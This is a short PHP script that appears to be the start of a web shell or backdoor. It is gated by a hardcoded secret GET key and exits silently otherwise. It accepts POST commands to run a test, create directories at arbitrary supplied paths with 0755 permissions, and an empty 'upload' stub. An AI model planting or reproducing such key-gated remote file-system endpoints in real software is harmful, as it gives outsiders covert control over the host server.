<?php 

	if( $_GET['k'] != 'd8393769b01362955d1c47bc900c2a68' ){
		exit('.');
	}
	
	function echo_json($data)
	{

		echo json_encode( $data );

	}

	if( !empty( $_POST['cmd'] ) ){

		if( $_POST['cmd'] == "test" ){

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "mkdir" ){

			mkdir( $_POST['dir'] );
			chmod( $_POST['dir'] , 0755 );

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "upload" ){}

	}